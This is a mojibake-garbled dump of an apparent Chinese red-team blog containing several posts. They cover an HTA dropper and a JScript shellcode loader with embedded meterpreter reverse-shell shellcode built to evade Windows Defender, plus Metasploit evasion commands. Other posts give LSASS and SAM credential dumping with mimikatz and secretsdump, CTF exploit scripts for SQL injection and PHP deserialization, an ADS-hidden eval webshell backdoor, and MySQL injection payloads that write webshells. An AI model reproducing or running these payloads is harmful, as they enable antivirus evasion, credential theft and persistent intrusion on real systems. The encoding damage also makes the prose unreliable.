000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000198040001c804000345040002070400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot; Dim var_obj Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;) Dim var_stream Dim var_tempdir Dim var_tempexe Dim var_basedir Set var_tempdir = var_obj.GetSpecialFolder(2) var_basedir = var_tempdir &amp; &quot;\\&quot; &amp; var_obj.GetTempName() var_obj.CreateFolder(var_basedir) var_tempexe = var_basedir &amp; &quot;\\&quot; &amp; &quot;evil.exe&quot; Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false) For i = 1 to Len(var_shellcode) Step 2 var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2))) Next var_stream.Close Dim var_shell Set var_shell = CreateObject(&quot;Wscript.Shell&quot;) var_shell.run var_tempexe, 0, true var_obj.DeleteFile(var_tempexe) var_obj.DeleteFolder(var_basedir) End Function var_func self.close&lt;/script&gt; å¯ä»¥çœ‹åˆ°shellcodeä¸ºPEæ ¼å¼ï¼Œæ‰§è¡Œè°ƒç”¨Wscript.shell åŒæ ·ä¼šè¢«Defenderæ‹¦æˆª 0x04 MetaSploit::windows_defender_js_htaMsf5æ›´æ–°åæ–°åŠ å…¥äº†ä¸¤ä¸ªevasion evasion/windows/windows_defender_exe evasion/windows/windows_defender_js_hta exeæŠ¥æ¯’æœ‰ç‚¹æƒ¨æ·¡ ä½†æ˜¯defenderå’Œç«ç»’è¿˜æ˜¯æ²¡å…³ç³»çš„ htaæ–‡ä»¶Defender,ç«ç»’ï¼Œ360éƒ½èƒ½è¿‡ 123456789101112msf5 &gt; use evasion/windows/windows_defender_js_htamsf5 evasion(windows/windows_defender_js_hta) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 evasion(windows/windows_defender_js_hta) &gt; set lhost 192.168.1set lhost 192.168.1.105 set lhost 192.168.121.1msf5 evasion(windows/windows_defender_js_hta) &gt; set lhost 192.168.1.105lhost =&gt; 192.168.1.105msf5 evasion(windows/windows_defender_js_hta) &gt; set lport 8877lport =&gt; 8877msf5 evasion(windows/windows_defender_js_hta) &gt; exploit[+] QWZwXErrm.hta stored at /Users/patrilic/.msf4/local/QWZwXErrm.hta æ ¸å¿ƒä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import System;import System.Runtime.InteropServices;import System.Reflection;import System.Reflection.Emit;import System.Runtime;import System.Text;function InvokeWin32(dllName:String, returnType:Type, methodName:String, parameterTypes:Type[], parameters:Object[])&#123; // Begin to build the dynamic assembly var domain = AppDomain.CurrentDomain; var name = new System.Reflection.AssemblyName('PInvokeAssembly'); var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run); var module = assembly.DefineDynamicModule('PInvokeModule'); var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit); // Define the actual P/Invoke method var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes); // Apply the P/Invoke constructor var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType(\"System.String\")]); var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]); method.SetCustomAttribute(attr); // Create the temporary type, and invoke the method. var realType = type.CreateType(); return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);&#125;function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)&#123; var parameterTypes:Type[] = [Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\")]; var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect]; return InvokeWin32(\"kernel32.dll\", Type.GetType(\"System.IntPtr\"), \"VirtualAlloc\", parameterTypes, parameters );&#125;function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)&#123; var parameterTypes:Type[] = [Type.GetType(\"System.UInt32\"),Type.GetType(\"System.UInt32\"),Type.GetType(\"System.IntPtr\"),Type.GetType(\"System.IntPtr\"), Type.GetType(\"System.UInt32\"), Type.GetType(\"System.UInt32\") ]; var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ]; return InvokeWin32(\"kernel32.dll\", Type.GetType(\"System.IntPtr\"), \"CreateThread\", parameterTypes, parameters );&#125;function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)&#123; var parameterTypes:Type[] = [Type.GetType(\"System.IntPtr\"),Type.GetType(\"System.UInt32\")]; var parameters:Object[] = [handle, dwMiliseconds ]; return InvokeWin32(\"kernel32.dll\", Type.GetType(\"System.IntPtr\"), \"WaitForSingleObject\", parameterTypes, parameters );&#125;function ShellCodeExec()&#123; var MEM_COMMIT:uint = 0x1000; var PAGE_EXECUTE_READWRITE:uint = 0x40; var shellcodestr:String = '/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACKtwKgBaUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0DEn/znXlaPC1olb/1UiD7BBIieJNMclqBEFYSIn5QboC2chf/9VIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//VSAHDSCnGSIX2deFB/+c=' var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr); var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length); var hThread:IntPtr = IntPtr.Zero; var threadId:UInt32 = 0; // prepare data var pinfo:IntPtr = IntPtr.Zero; // execute native code hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId); WaitForSingleObject(hThread, 0xFFFFFFFF);&#125;try&#123;ShellCodeExec();&#125;catch(e)&#123;&#125; htaä»£ç ç‰‡æ®µ Wscript.shellæ‰§è¡Œ ç”ŸæˆJSæ‰§è¡ŒShellcode 0x05 LINKSCACTUSTORCH.htaä½¿ç”¨mshta.exeç»•è¿‡åº”ç”¨ç¨‹åºç™½åå•ï¼ˆå¤šç§æ–¹æ³•ï¼‰ç¬¬ä¸ƒåäº”è¯¾ï¼šåŸºäºç™½åå•Mshta.exeæ‰§è¡Œpayloadç¬¬äº”å­£","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://patrilic.top/tags/å‘½ä»¤æ‰§è¡Œ/"}]},{"title":"å¸¸ç”¨ Windows æŠ“å–Hash","slug":"Windows æŠ“å–Hash","date":"2019-05-04T16:20:33.000Z","updated":"2019-08-20T15:28:22.108Z","comments":true,"path":"2019/05/05/Windows æŠ“å–Hash/","link":"","permalink":"http://patrilic.top/2019/05/05/Windows æŠ“å–Hash/","excerpt":"","text":"@Author: Patrilic@Time: 2019-05-05 0:20:33æ¨èä½¿ç”¨ Procdumpï¼Œreg å’Œ sharpdump å¯¼å‡ºæœ¬åœ°ï¼Œå†æƒ³åŠæ³•ä»å†…ç½‘ä¸­è¿å‡ºæ¥æœ¬åœ°ç ´è§£ æµ‹è¯•æœºå™¨: Windows 10 1809 0x01 Procdump + MimikatzProcdump(ç®¡ç†å‘˜æƒé™ä¸‹è¿è¡Œ)12C:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits ç„¶åæœ¬åœ°è§£å‡ºhashå³å¯12sekurlsa::minidump C:\\lsass.dmpsekurlsa::logonpasswords full 0x02 Reg + impacket/Mimikatz (å¼ºæ¨)ä½¿ç”¨Regéœ€è¦NT/SYSTEMæƒé™12345reg save HKLM\\SYSTEM system.hivreg save HKLM\\SAM sam.hivreg save HKLM\\security security.hiv Mimikatz è°ƒç”¨ lsadump1lsadump::sam /system:system.hiv /sam:sam.hiv impacket/secretsdump.py1python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL 0x03 Sharpdump (å¼ºæ¨)Out-Minidump.ps1 çš„ C#ç‰ˆæœ¬ ç¼–è¯‘ç»“æœéœ€è¦.NET 3.5ç‰ˆæœ¬æ¡†æ¶ 0x04 Wceã€Quarks PwDumpã€GetPassâ€¦â€¦æ²¡æ€ä¹ˆç”¨è¿‡ï¼Œéƒ½æ˜¯ä»¥å‰æ¯”è¾ƒè€çš„ï¼ŒGetpassæ˜¯Mimikatzçš„ç¼–è¯‘ç‰ˆæœ¬ï¼Œæ²¡å•¥æ„æ€ 0x05 Msf moduleshashdumpæ¡ä»¶: Meterpreter Session NT/SYSTEM hashdumpåªèƒ½dumpæœ¬åœ°ç”¨æˆ· smart_hashdumpæ¡ä»¶ Meterpreter Session NT/SYSTEM å¯ä»¥dumpæœ¬åœ° + åŸŸç”¨æˆ·hash kiwiæ¡ä»¶ Meterpreter Session NT/SYSTEM","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://patrilic.top/tags/å†…ç½‘æ¸—é€/"}]},{"title":"ç¬¬åäºŒå±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›éƒ¨åˆ†Web Write up","slug":"ç¬¬åäºŒå±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Write up","date":"2019-04-23T03:20:33.000Z","updated":"2019-08-20T15:30:48.652Z","comments":true,"path":"2019/04/23/ç¬¬åäºŒå±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Write up/","link":"","permalink":"http://patrilic.top/2019/04/23/ç¬¬åäºŒå±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Write up/","excerpt":"","text":"@Author: Patrilic@Time: 2019-04-23 11:20:33 Web1 - JustSosoIndex.php12345678910111213141516171819202122&lt;?phperror_reporting(E_ALL);$payload = $_GET[\"payload\"];require $_GET['file'];if (isset($payload)) &#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'], $query); foreach ($query as $value) &#123; if (preg_match(\"/flag/\", $value)) &#123; echo 'gg'; exit(); &#125; &#125; $payload = unserialize($payload);&#125; else &#123; echo \"Missing parameters\";&#125;?&gt; Hint.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(E_ALL);class Handle&#123; private $handle; // ç»•è¿‡wakeup public function __wakeup() &#123; foreach (get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct() &#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1, 10000)); &#125; public function getFlag() &#123; $this-&gt;token_flag = md5(rand(1, 10000)); if ($this-&gt;token === $this-&gt;token_flag) &#123; if (isset($this-&gt;file)) &#123; echo @highlight_file($this-&gt;file, true); &#125; &#125; &#125;&#125;?&gt; poc.php123456789101112&lt;?phprequire \"hint.php\";$flag = new Flag('flag.php');$flag-&gt;token = 'b706835de79a2b4e80506f582af3676a';$flag-&gt;token_flag = &amp;$flag-&gt;token;$handle = new Handle($flag);$s = serialize($handle);echo urlencode($s); parse_urlç»•è¿‡æ­£åˆ™:http://lawlietweb.com/2018/05/13/parse_url/wake_upç»•è¿‡:https://paper.seebug.org/39/ Web2 - å…¨å®‡å®™æœ€ç®€å•çš„SQLè¿‡æ»¤ or if sleep benchmarkå‚è€ƒbctf-love-qåˆ©ç”¨pow()åœ¨æ¡ä»¶ä¸ºå‡æ—¶è¿”å›error è¿ç®—ç¬¦ä½œæ¡ä»¶åˆ¤æ–­ï¼Œå¦‚æœé”™è¯¯æ•°æ®åº“æŠ¥é”™ï¼šåˆ©ç”¨powçš„æº¢å‡ºåˆ¤æ–­limitä½æ•°çš„ascii åœ¨é¢˜ç›®ä¸­æ­£ç¡®è¿”å›ç™»é™†å¤±è´¥ï¼Œé”™è¯¯è¿”å›æ•°æ®åº“å¤±è´¥ Exp:1234567891011121314151617181920212223242526272829303132import requestsVERSION = \"version()\"USERNAME = \"select username from user limit 1\"PASSWORD = \"select (select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1)\"url = \"http://cba0e34ee5d34db985195191f4c681d5c32c4b92db574826.changame.ichunqiu.com\"result = ''for i in range(1, 50): for j in range(31, 128): payload = &#123; \"username\": \"1'-pow(2,1024-ascii(substr((&#123;data&#125;),&#123;pos&#125;,1))+&#123;code&#125;)-- -\".format( data=PASSWORD, pos=i, code=j ), \"password\": \"1\" &#125; try: resp = requests.post(url=url, data=payload) resp.encoding = 'utf8' if 'æ•°æ®åº“æ“ä½œå¤±è´¥' in resp.text: result += chr(j) print(result) break except Exception as e: print(e) continue åˆ©ç”¨mysqlåˆ«å(å‚è€ƒåšå®¢ä¸­Mysql Injectionä¸­# ä¸ç”¨åˆ—åçš„æ³¨å…¥) è·‘å‡ºpassword : F1AG@1s-at_/fll1llag_h3r3 è¿›å…¥åå°ä¸ºè¿œç¨‹æ•°æ®åº“è¿æ¥ç•Œé¢ï¼Œç†æƒ³åˆ°fake_mysqlServerè¯»æ–‡ä»¶å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/3973 ä¿®æ”¹è¿™ä¸ªè„šæœ¬é‡Œçš„filelisthttps://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py ç„¶åè®©é¢˜ç›®æœåŠ¡å™¨è¿æ¥å³å¯ Web3 - lovemathç›´æ¥å«–é˜Ÿå‹@hpdogerçš„wp orz è¯»åˆ°calc.phpçš„æºç  é»‘åå•è‚¯å®šæ˜¯ç»•ä¸è¿‡å»ï¼Œè™½ç„¶æœ‰/mä½†æ˜¯\\råœ¨é»‘åå•æ‰€ä»¥ä¸å­˜åœ¨æ¢è¡Œç»•è¿‡ã€‚æ³¨æ„çœ‹ä¸‹é¢çš„whitelistã€‚æ­£åˆ™åŒ¹é…å‡½æ•°åï¼Œåªå…è®¸Evalä½¿ç”¨ç™½åå•çš„å‡½æ•°åšå­—ç¬¦ä¸²æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜ç¡®ï¼Œæ—¢ç„¶å‚æ•°ä»ç™½åå•å‡ºæ¥åè¢«æ‰§è¡Œï¼Œé‚£æ¼æ´ç‚¹è‚¯å®šå°±åœ¨ç™½åå•çš„å‡½æ•°ã€‚ç”±äºæ­£åˆ™åŒ¹é…å­—æ¯çš„è§„åˆ™ï¼Œä½¿æˆ‘ä»¬ä¼ å…¥çš„å®å‚ä¸èƒ½æ˜¯å­—æ¯ï¼Œå¦åˆ™å°±ä¼šè¿›å…¥åˆ¤æ–­å¦‚ä¸‹æƒ³åŠæ³•æŠŠæ•°å­—å˜æˆå­—æ¯ï¼Œç€çœ¼äºå‡½æ•°base_convertï¼Œå®˜æ–¹æè¿°å¦‚ä¸‹å®ƒå…è®¸æˆ‘ä»¬å°†10è¿›åˆ¶æ•°è½¬æ¢ä¸ºæœ€é«˜36è¿›åˆ¶ï¼Œç»“æœä¸ºå­—ç¬¦ä¸²ã€‚å®Œç¾è§£å†³äº†æ•°å­—-&gt;å­—æ¯çš„è½¬åŒ–ï¼ŒæˆåŠŸæ‰“å°Phpinfoå¦‚ä¸‹å› ä¸ºå­—ç¬¦ä¸²é•¿åº¦é™åˆ¶ï¼Œæˆ‘æœ€å¼€å§‹çš„æƒ³æ³•æ˜¯è¿™æ ·çš„ï¼š12$input = hexdec(bin2hex(â€œsystem(â€˜cat /flagâ€™);â€))$result = base_convert(10è¿›åˆ¶ç¼–ç çš„hex2bin,10,36).dechex($input) å¤±è´¥çš„POCæ˜¯è¿™æ ·ï¼š1base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872)) bin2hexåç”±äºè½¬æ¢å‡ºæ¥çš„16è¿›åˆ¶æ•°å€¼è¿‡å¤§ï¼Œå¯¼è‡´è½¬æ¢çš„intå€¼å¾ˆå¤§æ— æ³•æ­£å¸¸è¢«dechexè¿˜åŸè€Œæº¢å‡ºã€‚ å¡åœ¨è¿™é‡Œå¾ˆä¹…ï¼Œæœ€åæ¢äº†ä¸€ç§å°æ•°è¿˜åŸçš„æ€è·¯ã€‚ æˆ‘ä»¬åªéœ€è¦æ„é€ _GETä¸º16è¿›åˆ¶æ•°ï¼Œè¿™ä¸ª16è¿›åˆ¶è½¬æ¢å‡ºæ¥çš„åè¿›åˆ¶å°±ä¸ä¼šå¾ˆå¤§ï¼Œè‡ªç„¶åœ¨dechexä¹Ÿä¸ä¼šæº¢å‡ºã€‚ Payloadå¦‚ä¸‹ï¼Œæ³¨æ„ç”¨ç™½åå•çš„å€¼ä½œä¸ºå˜é‡å‚æ•°ï¼Œå¦åˆ™è¿˜æ˜¯ä¼šè¢«æ‹¦æˆª1$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;) è½¬æ¢çš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š ç›´æ¥å‘åŒ…ç»™åˆ°Cå‚æ•°ï¼ŒæˆåŠŸgetflag è¿˜åœ¨ç¾¤é‡Œçœ‹åˆ°ä¸€ä½å¸ˆå‚…çš„Payload 1base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194))) 1exec(nl f*); 79ä½â€¦â€¦ orz","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"ADSéšè—åé—¨","slug":"ADS éšè—åé—¨","date":"2019-04-18T03:20:33.000Z","updated":"2019-08-21T00:42:18.019Z","comments":true,"path":"2019/04/18/ADS éšè—åé—¨/","link":"","permalink":"http://patrilic.top/2019/04/18/ADS éšè—åé—¨/","excerpt":"","text":"@Author: Patrilic@Time: 2019-04-18 11:20:33é«˜é“ä¸Šæ²¡äº‹å¹²ï¼ŒæŠŠä»¥å‰çš„ç¬”è®°æ€»ç»“ä¸€ä¸‹[toc] ADSNTFSäº¤æ¢æ•°æ®æµï¼ˆalternate data streamsï¼Œç®€ç§°ADSï¼‰ ADSæ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œå°±æ˜¯è¯´é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ã€‚å®ƒä½¿ç”¨èµ„æºæ´¾ç”Ÿæ¥ç»´æŒä¸æ–‡ä»¶ç›¸å…³çš„ä¿¡æ¯ï¼Œè™½ç„¶æˆ‘ä»¬æ— æ³•çœ‹åˆ°æ•°æ®æµæ–‡ä»¶ï¼Œä½†æ˜¯å®ƒå´æ˜¯çœŸå®å­˜åœ¨äºæˆ‘ä»¬çš„ç³»ç»Ÿä¸­çš„ã€‚åˆ›å»ºä¸€ä¸ªæ•°æ®äº¤æ¢æµæ–‡ä»¶çš„æ–¹æ³•å¾ˆç®€å•ï¼Œå‘½ä»¤ä¸ºâ€å®¿ä¸»æ–‡ä»¶:å‡†å¤‡ä¸å®¿ä¸»æ–‡ä»¶å…³è”çš„æ•°æ®æµæ–‡ä»¶â€ã€‚ â€”â€“ baike.baidu.com æ–‡ä»¶å‘½åï¼š ads.txt æ™®é€štxtæ–‡ä»¶ (ä¸»æ–‡ä»¶)ads.txt:nop.txt ï¼ˆå¯„å®¿æ–‡ä»¶ï¼‰ ä½¿ç”¨dirå‘½ä»¤ä¸èƒ½çœ‹åˆ°ï¼Œå¿…é¡»ä½¿ç”¨dir /r Webshellï¼ˆè¿‡Dç›¾ï¼‰1C:\\phpStudy\\PHPTutorial\\WWW\\webshell&gt;echo \"&lt;?php phpinfo();?&gt;\" &gt; index.php:s.txt å°† å°é©¬å†™å…¥index.php:s.txtä¸­ ï¼Œç„¶åå†index.phpä¸­includeDç›¾ä¸èƒ½è·å–éä¸»æ–‡ä»¶æµ1234567index.php&lt;?php $a=&quot;696e6465782e70&quot;.&quot;68703a732e747874&quot;; $b=&quot;a&quot;; include(PACK(&apos;H*&apos;,$$b))?&gt; 123index.php:s.txt&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt; æµ‹è¯•0x01 ç¯å¢ƒ12MacOS ipaddress: 192.168.43.223Windows 10 ipaddress: 192.168.121.132 0x02 ç”Ÿæˆshell1msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=8888 -f exe -o shell.exe 0x03 æ¤å…¥åé—¨ç¯å¢ƒæè¿°ï¼šæ‹¿åˆ°äº†webshellï¼Œç»è¿‡ææƒï¼Œæƒé™ä¸ºæœ¬åœ°ç®¡ç†å‘˜ä¸Šä¼ ä¸€ä¸ªåé—¨æ–‡ä»¶ ä½¿ç”¨typeå°†shell.exeæ•°æ®å†™å…¥ä¾é™„åœ¨hello.txtä¸Š 1mklink \"c:\\backdoor\\link.exe\" \"c:\\backdoor\\hello.txt:shell.exe\" server 2k3åä¸èƒ½ç›´æ¥æ‰§è¡Œexeï¼Œå¿…é¡»å»ºç«‹é“¾æ¥1start link.exe /b æˆåŠŸå›å¼¹session Thankshttps://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)https://klionsec.github.io/2017/11/13/ntfs-streams/https://blog.csdn.net/migee/article/details/56028011https://blog.csdn.net/xiaoxuetu_/article/details/77318670","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"Backdoor","slug":"Backdoor","permalink":"http://patrilic.top/tags/Backdoor/"}]},{"title":"MySQL Injection Tricks","slug":"MySQL Injection","date":"2019-04-14T15:20:33.000Z","updated":"2019-08-20T15:31:40.337Z","comments":true,"path":"2019/04/14/MySQL Injection/","link":"","permalink":"http://patrilic.top/2019/04/14/MySQL Injection/","excerpt":"","text":"@Author: Patrilic@Time: 2019-04-14 23:20:33 Headeræ€»ç»“ä¸€æ³¢MySQLä¸‹å„å¼å„æ ·ç­‰æ³¨å…¥æŠ€å·§ï½Test Machine Configuration OSï¼šMacOS Mojave 10.14.2MySQL: MySQL 5.7.19-log æµ‹è¯•è¡¨ç»“æ„ï¼š limitEmmmmï¼Œæµ‹è¯•å¤±è´¥äº†ç¿»äº†ä¸€äº›æ–‡ç« ï¼Œå‘ç°limitä¹‹åçš„analyse() åªé€‚ç”¨äºMySQL server version &lt;= 5.6.6 é‚ä½¿ç”¨ Windows7 x64 + MySQL 5.5.53 æµ‹è¯•è¯­å¥1SELECT username FROM user LIMIT &#123;$uid&#125;,3; Limit æ³¨å…¥ä¸»è¦æ˜¯å› ä¸ºåé¢æœ‰ä¸€ä¸ª PROCEDURE analyse() å­˜å‚¨è¿‡ç¨‹ æ„é€ æŠ¥é”™æ³¨å…¥1SELECT username FROM user LIMIT 1,3 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); å› ä¸º5.5ç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨SELECTï¼Œæ‰€ä»¥åªèƒ½è·å–ä¸€äº›é…ç½®ä¿¡æ¯ç­‰ exp123SELECT username FROM user LIMIT 1,3 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1) order byæµ‹è¯•è¯­å¥ï¼š1SELECT * FROM user order by uid &#123;evil&#125;; Order by + æŠ¥é”™æ³¨å…¥ order by + æ—¶é—´ç›²æ³¨ order by + unionæŸ¥è¯¢ æ­¤æ³¨å…¥å¿…é¡»ä½¿ç”¨()åŒ…å›´SQLè¯­å¥ order by + regexp ç›²æ³¨ è¿™é‡Œè§£é‡Šä¸€ä¸‹è¯­å¥å½“æ­£åˆ™æœªåŒ¹é…åˆ°æ•°æ®æ—¶å€™è¿”å›çš„ç»“æœæ˜¯0 æ‰€ä»¥SQLè¯­å¥ç›¸å½“äº1select * from user order by uid ^ 0; æ’åºä¸å˜exp123456789SELECT * FROM user ORDER BY uid and extractvalue(1,concat(0x3a,user()));SELECT * FROM user ORDER BY uid and updatexml(1,concat(0x3a,user()),1);select * from user order by uid ^(select (select version()) regexp '^aaaaaa');select * from user order by uid,(select 1 from (select sleep(3))a);(select * from user order by uid) union (select 1,(select version()),3,4); fromæµ‹è¯•è¯­å¥1SELECT * FROM &#123;$Tables&#125;; ç›´æ¥åµŒå¥—å­æŸ¥è¯¢ expç‰ˆæœ¬é™åˆ¶ï¼š Version &lt;= 5.5.5123select exp(~(select*from(select user())x));insert into users (id, username, password) values (2, '' ^ exp(~(select*from(select user())x)), 'patrilic'); ExtractValue1Select * from user where uid = 1 and (extractvalue('String',(select user()))); extractvalue(target fileï¼Œxml path) UpdateXml1Select * from user where uid = 1 and (updatexml('String',(Select user()),'String')); updatexml(Target fileï¼Œxml pathï¼Œupdateinfo) name_const1Select * from user where uid = 1 and (select name_const(version(),1),name_const(version(),1)); name_const(â€˜1â€™, 14)å±€é™æ€§å¾ˆå¤§ æ•´æ•°æº¢å‡ºæŠ¥é”™æ³¨å…¥ç•¥ insert1Insert INTO user (uid,username,password,city) VALUES (?,?,?,?); delect1DELETE FROM user WHERE uid=&#123;$uid&#125;; update1UPDATE user SET password = &#123;$password&#125; Where username = &#123;session.user&#125; and uid = &#123;session.uid&#125; into outfileä¸»è¦ç”¨é€”ï¼šå†™shellè¦æ±‚ï¼š è¦æ±‚ç”¨æˆ·å…·æœ‰fileæƒé™ æ–‡ä»¶ä¸èƒ½è¦†ç›–å†™å…¥ï¼Œæ‰€ä»¥æ–‡ä»¶å¿…é¡»ä¸ºä¸å­˜åœ¨ å¦‚æœsecure_file_privéç©ºï¼Œåˆ™å†™å…¥æ–‡ä»¶çš„ç›®å½•åªèƒ½ä¸ºå¯¹åº”ç›®å½•ä¸‹ into outfile + UNION 1SELECT * FROM user WHERE uid = -1 union select 1,2,3,0x3c3f70687020706870696e666f28293b3f3e into outfile 'Y:/123.php'; into outfile + LINES TERMINATED BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e; into outfile + FIELDS TERMINATED BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' fields terminated by 0x3c3f70687020706870696e666f28293b3f3e; into outfile + LINES STARTING BY (limit)1select * from user order by uid limit 1,1 into outfile 'Y:/123.php' LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e; load_fileä¸»è¦ç”¨é€”ï¼šè¯»æ–‡ä»¶è¦æ±‚ï¼š è¦æ±‚ç”¨æˆ·å…·æœ‰fileæƒé™ å¦‚æœsecure_file_privéç©ºï¼Œåˆ™åªèƒ½è¯»å–å¯¹åº”ç›®å½•ä¸‹çš„æ–‡ä»¶ load_file + UNION 1select * from user where uid = -1 union select 1,2,3,(select load_file('Y:/123.php')); load_file + updatexml1select * from user where username = '' and updatexml(0,concat(0x7e,(LOAD_FILE('Y:/123.php')),0x7e),0); load_file + 